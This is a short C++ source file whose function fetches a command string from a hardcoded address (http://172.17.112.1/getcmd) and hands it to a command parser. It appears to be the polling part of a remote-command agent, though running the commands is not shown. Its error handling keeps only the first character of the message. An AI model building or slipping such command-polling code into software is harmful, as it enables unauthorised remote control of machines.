//
// Created by nicla on 20.10.2022.
//
#include <iostream>
#include "SendRequest.h"
#include "HTTPRequest.hpp"
#include "ResponseParser.h"
string HttpParser::ParseResponse() {
    string output;
    cout<< "methexec"<<endl;
    try
    {
        // you can pass http::InternetProtocol::V6 to Request to make an IPv6 request
        http::Request request{"http://172.17.112.1/getcmd"};

        // send a get request
        const auto response = request.send("GET");
        output = {response.body.begin(), response.body.end()};


    }
    catch (const std::exception& e)
    {
        output += *e.what();
    }
    cout << output <<endl;
    return ResponseParser::ParseBasicCMD(output);
}